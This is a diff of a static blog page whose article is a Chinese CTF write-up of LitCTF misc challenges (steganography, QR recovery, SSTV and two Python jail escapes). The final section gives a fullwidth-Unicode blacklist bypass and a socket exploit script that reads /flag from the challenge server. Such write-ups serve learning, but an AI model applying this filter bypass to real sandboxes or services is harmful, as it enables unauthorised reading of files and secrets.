@@ -34,21 +34,21 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1779629707336">
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1779712834654">
 
     <link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
 
-<link rel="stylesheet" href="/css/style.css?v=1779629707336">
+<link rel="stylesheet" href="/css/style.css?v=1779712834654">
 
 
 
 
     
-        <link rel="stylesheet" href="/custom.css?v=1779629707336">
+        <link rel="stylesheet" href="/custom.css?v=1779712834654">
     
-        <link rel="stylesheet" href="/themes/umaru/index.css?v=1779629707336">
+        <link rel="stylesheet" href="/themes/umaru/index.css?v=1779712834654">
     
-        <link rel="stylesheet" href="/themes/asuka/index.css?v=1779629707336">
+        <link rel="stylesheet" href="/themes/asuka/index.css?v=1779712834654">
     
 
 
@@ -58,7 +58,17 @@
 <script src="/lib/lax.min.js" async></script>
 
 
-<script async src="/js/app.js?v=1779629707336"></script>
+<script>
+(function waitFancybox() {
+  if (typeof Fancybox !== 'undefined') {
+    Fancybox.bind('[data-fancybox]', { Hash: false });
+  } else {
+    setTimeout(waitFancybox, 100);
+  }
+})();
+</script>
+
+<script async src="/js/app.js?v=1779712834654"></script>
 
  
 
@@ -117,53 +127,67 @@
         
     </div>
     
-    <!-- 文章分类组件 -->
+    
     <div class="nexmoe-widget-wrap">
         <h3 class="nexmoe-widget-title">文章分类</h3>
         <div class="nexmoe-widget">
             <ul class="category-list">
-                <!-- 手动构建分类树 -->
-                <li class="category-list-item">
+                
+                <li class="category-list-item" style="padding-left: 0px;">
+                    
                     <span class="category-toggle" onclick="toggleCategory(this)">
                         <i class="nexmoefont iconfont icon-caret-down"></i>
                     </span>
+                    
                     <a class="category-list-link" href="/categories/CTF/">CTF</a>
-                    <span class="category-list-count">3</span>
+                    <span class="category-list-count">6</span>
+                    
                     <ul class="category-children">
-                        <li class="category-list-item" style="padding-left: 15px;">
-                            <a class="category-list-link" href="/categories/CTF/做题笔记/">做题笔记</a>
-                            <span class="category-list-count">1</span>
-                        </li>
-                        <li class="category-list-item" style="padding-left: 15px;">
-                            <a class="category-list-link" href="/categories/CTF/心得/">心得</a>
-                            <span class="category-list-count">2</span>
-                        </li>
-                        <li class="category-list-item" style="padding-left: 15px;">
-                            <a class="category-list-link" href="/categories/CTF/我的wp/">我的wp</a>
-                            <span class="category-list-count">0</span>
-                        </li>
-                    </ul>
+                        
+                <li class="category-list-item" style="padding-left: 15px;">
+                    
+                    <a class="category-list-link" href="/categories/CTF/做题笔记/">做题笔记</a>
+                    <span class="category-list-count">4</span>
+                    
                 </li>
-                <li class="category-list-item">
+                
+                <li class="category-list-item" style="padding-left: 15px;">
+                    
+                    <a class="category-list-link" href="/categories/CTF/心得/">心得</a>
+                    <span class="category-list-count">2</span>
+                    
+                </li>
+                
+                    </ul>
+                    
+                </li>
+                
+                <li class="category-list-item" style="padding-left: 0px;">
+                    
                     <span class="category-toggle" onclick="toggleCategory(this)">
                         <i class="nexmoefont iconfont icon-caret-down"></i>
                     </span>
+                    
                     <a class="category-list-link" href="/categories/电子取证/">电子取证</a>
                     <span class="category-list-count">2</span>
+                    
                     <ul class="category-children">
-                        <li class="category-list-item" style="padding-left: 15px;">
-                            <a class="category-list-link" href="/categories/电子取证/做题笔记/">做题笔记</a>
-                            <span class="category-list-count">2</span>
-                        </li>
-                        <li class="category-list-item" style="padding-left: 15px;">
-                            <a class="category-list-link" href="/categories/电子取证/心得/">心得</a>
-                            <span class="category-list-count">0</span>
-                        </li>
-                    </ul>
+                        
+                <li class="category-list-item" style="padding-left: 15px;">
+                    
+                    <a class="category-list-link" href="/categories/电子取证/做题笔记/">做题笔记</a>
+                    <span class="category-list-count">2</span>
+                    
                 </li>
+                
+                    </ul>
+                    
+                </li>
+                
             </ul>
         </div>
     </div>
+    
     
     <style>
         .category-toggle {
@@ -620,7 +644,7 @@
 </style>
 
 
-    <script async src="/js/search.js?v=1779629707337"></script>
+    <script async src="/js/search.js?v=1779712834655"></script>
         
 
             
@@ -730,35 +754,35 @@
     
 </div>
 
-    <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="lit-lsb-base64"><a href="#lit-lsb-base64" class="headerlink" title="lit_lsb_base64"></a>lit_lsb_base64</h2><p>拿到附件，图片名字是stego，直接zsteg得到编码<br><img src="/wzimg/2026-05-23-11-14-39.png"></p>
+    <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="lit-lsb-base64"><a href="#lit-lsb-base64" class="headerlink" title="lit_lsb_base64"></a>lit_lsb_base64</h2><p>拿到附件，图片名字是stego，直接zsteg得到编码<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-14-39.png" alt="" data-caption="" loading="lazy"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TGl0Q1RGe2xzYl8xc19mdW5fdzF0aF9iNHMzXzY0fQ==</span><br></pre></td></tr></table></figure>
 
 <p>base64解码得到flag</p>
-<p><img src="/wzimg/2026-05-23-11-15-26.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-15-26.png" alt="" data-caption="" loading="lazy"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;lsb_1s_fun_w1th_b4s3_64&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="lit-rush-qr"><a href="#lit-rush-qr" class="headerlink" title="lit_rush_qr"></a>lit_rush_qr</h2><p>得到gif，最后一帧有二维码</p>
-<p><img src="/wzimg/2026-05-23-11-17-31.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-17-31.png" alt="" data-caption="" loading="lazy"></p>
 <p>添加定位符后扫码得到flag</p>
-<p><img src="/wzimg/2026-05-23-11-17-55.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-17-55.png" alt="" data-caption="" loading="lazy"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;qr_h1gh_3rr_c0r_r3c0v3ry&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="lit-sstv"><a href="#lit-sstv" class="headerlink" title="lit_sstv"></a>lit_sstv</h2><p>提示是sstv，直接用工具</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sstv -d signal.wav -o result.png</span><br></pre></td></tr></table></figure>
 
 <p>得到图片</p>
-<p><img src="/wzimg/2026-05-23-11-20-16.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-20-16.png" alt="" data-caption="" loading="lazy"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;sstv_p4t13nc3&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="lit-welcome"><a href="#lit-welcome" class="headerlink" title="lit_welcome"></a>lit_welcome</h2><p>附件是全白的图片，尝试用stegsolve打开得到flag</p>
-<p><img src="/wzimg/2026-05-23-11-25-19.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-25-19.png" alt="" data-caption="" loading="lazy"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;w3lc0m3_t0_m1sc_w0rld&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="lit-pyjail-reader"><a href="#lit-pyjail-reader" class="headerlink" title="lit_pyjail_reader"></a>lit_pyjail_reader</h2><p>简单的pyjail题目，考查文件读取<br><img src="/wzimg/2026-05-23-11-31-41.png"><br>分析一下函数<br><img src="/wzimg/2026-05-23-11-32-04.png"></p>
+<h2 id="lit-pyjail-reader"><a href="#lit-pyjail-reader" class="headerlink" title="lit_pyjail_reader"></a>lit_pyjail_reader</h2><p>简单的pyjail题目，考查文件读取<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-31-41.png" alt="" data-caption="" loading="lazy"><br>分析一下函数<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-32-04.png" alt="" data-caption="" loading="lazy"></p>
 <p>第一步反转字符<br>第二部读取目录&#x2F;app&#x2F;where_is_flag.txt<br>第三部得到flag</p>
-<p><img src="/wzimg/2026-05-23-11-30-50.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-30-50.png" alt="" data-caption="" loading="lazy"></p>
 <h2 id="lit-pyjail-unicode"><a href="#lit-pyjail-unicode" class="headerlink" title="lit_pyjail_unicode"></a>lit_pyjail_unicode</h2><p>依旧分析代码</p>
-<p><img src="/wzimg/2026-05-23-11-36-50.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-36-50.png" alt="" data-caption="" loading="lazy"></p>
 <p>黑名单用 ASCII 正则检查源码文本，但 Python 解释器会将全角（Fullwidth）Unicode 字符 ｏｐｅｎ 规范化后等同于 open<br>构造payload:ｏｐｅｎ(“&#x2F;flag”).read()</p>
 <ul>
 <li>ASCII 正则 \bopen\b 在源码字节层面上匹配——它看到的是 Unicode 码点 \uff4f\uff50\uff45\uff4e ，不匹配 open</li>
@@ -769,7 +793,7 @@
 <p>exp:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.settimeout(10)</span><br><span class="line">s.connect((&quot;challenge.cyclens.tech&quot;, <span class="number">31299</span>))</span><br><span class="line"><span class="comment"># 收完 banner</span></span><br><span class="line">b = b<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> b<span class="string">&quot;&gt; &quot;</span> not <span class="keyword">in</span> b:</span><br><span class="line">    b += s.recv(4096)</span><br><span class="line"><span class="comment"># 全角 Unicode 绕过: ｏｐｅｎ → NFKC 归一化为 open</span></span><br><span class="line">p = <span class="string">&#x27;\uff4f\uff50\uff45\uff4e(&quot;/flag&quot;).read()&#x27;</span></span><br><span class="line">s.sendall(p.encode() + b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 收结果</span></span><br><span class="line">r = b<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    c = s.recv(4096)</span><br><span class="line">    <span class="keyword">if</span> not c:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    r += c</span><br><span class="line"><span class="built_in">print</span>(r.decode(errors=<span class="string">&quot;replace&quot;</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wzimg/2026-05-23-11-38-45.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/wzimg/2026-05-23-11-38-45.png" alt="" data-caption="" loading="lazy"></p>
 
     
   </article>
@@ -798,7 +822,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1779629707307"></script>
+    <script async src="/js/copy-codeblock.js?v=1779712834630"></script>
   
 
   
